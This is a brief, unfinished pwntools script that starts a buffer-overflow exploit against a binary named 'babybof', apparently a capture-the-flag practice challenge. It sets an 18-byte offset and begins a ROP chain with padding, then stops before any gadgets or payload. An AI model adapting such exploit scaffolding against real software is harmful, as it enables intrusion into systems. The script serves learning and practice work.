from pwn import *

elf = context.binary = ELF("./babybof")

offset = 18

rop = ROP(elf)
rop.raw(b'A' * offset)

